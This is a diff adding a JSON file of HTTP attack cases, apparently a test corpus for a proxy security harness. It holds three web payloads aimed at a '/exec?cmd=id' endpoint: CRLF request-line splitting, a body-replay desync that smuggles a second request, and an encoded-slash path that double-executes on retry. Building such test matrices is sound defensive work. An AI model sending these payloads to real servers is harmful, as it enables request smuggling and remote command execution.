@@ -1,0 +1,53 @@
+{
+ "dialect": "flat",
+ "build": "f2b3415b",
+ "prefix": "/api",
+ "cells": [
+  {
+   "family": "request_line_split",
+   "build": "f2b3415b",
+   "dialect": "flat",
+   "source": "r15G",
+   "poc": "ev_r14_A_probe2.py",
+   "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/x?a%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
+    }
+   ]
+  },
+  {
+   "family": "body_replay_desync",
+   "build": "f2b3415b",
+   "dialect": "flat",
+   "source": "r15G",
+   "poc": "ev_r14_A_probe2.py",
+   "shape": "POST with no framing header; the tail is re-parsed as the next request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "raw": "POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
+    }
+   ]
+  },
+  {
+   "family": "retry_double_exec",
+   "build": "f2b3415b",
+   "dialect": "flat",
+   "source": "r15G",
+   "poc": "ev_r14_A_probe2.py",
+   "shape": "upstream executes then dies; the retry executes the same command again",
+   "expect": "retry",
+   "fail_first": 1,
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/%2fexec%3fcmd=id"
+    }
+   ]
+  }
+ ]
+}
